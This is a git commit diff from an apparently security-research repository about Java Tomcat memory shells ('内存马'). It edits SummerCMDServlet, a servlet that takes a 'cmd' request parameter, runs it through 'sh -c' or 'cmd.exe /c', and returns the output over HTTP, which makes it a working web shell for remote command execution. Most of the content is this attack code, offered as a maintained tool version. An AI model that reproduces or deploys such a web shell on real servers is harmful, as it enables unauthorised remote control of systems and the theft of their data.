560edb5eca42effbb5afd2943f95a339e7d82a26
233 <ayusummer233@vip.qq.com>
2024-09-30 10:26:51 +0800

    ✨ Tomcat Servlet 内存马 - version 1.0.3 - 删除掉原本的恶意Servlet保留我认为合适的Servlet后 - 也是可以正常使用的

--- Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/SummerCMDServlet.java
+++ Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/SummerCMDServlet.java
@@ -2,7 +2,6 @@ package com.summer233;
 
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.PrintWriter;
 import java.util.Scanner;
 
 import javax.servlet.Servlet;
@@ -32,15 +31,15 @@ public class SummerCMDServlet implements Servlet {
       servletResponse.setCharacterEncoding("UTF-8");
       servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
       HttpServletRequest req = (HttpServletRequest) servletRequest;
-      String cmdline = req.getParameter("cmdline");
-      if (cmdline != null) {
+      String cmd = req.getParameter("cmd");
+      if (cmd != null) {
          boolean isLinux = true;
          String osTyp = System.getProperty("os.name");
          if (osTyp != null && osTyp.toLowerCase().contains("win")) {
             isLinux = false;
          }
-         String[] cmds = isLinux ? new String[] { "sh", "-c", cmdline }
-               : new String[] { "cmd.exe", "/c", cmdline };
+         String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
+               : new String[] { "cmd.exe", "/c", cmd };
          InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
          Scanner s = new Scanner(in).useDelimiter("\\a");
          String output = s.hasNext() ? s.next() : "";
@@ -48,21 +47,6 @@ public class SummerCMDServlet implements Servlet {
          servletResponse.getWriter().flush();
          servletResponse.getWriter().close();
       }
-
-      // String cmd = servletRequest.getParameter("cmd");
-      // boolean isLinux = true;
-      // String osTyp = System.getProperty("os.name");
-      // if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-      //    isLinux = false;
-      // }
-      // String[] cmds = isLinux ? new String[] { "sh", "-c", cmd } : new String[] { "cmd.exe", "/c", cmd };
-      // InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-      // Scanner s = new Scanner(in).useDelimiter("\\a");
-      // String output = s.hasNext() ? s.next() : "";
-      // PrintWriter out = servletResponse.getWriter();
-      // out.println(output);
-      // out.flush();
-      // out.close();
    }
 
    @Override
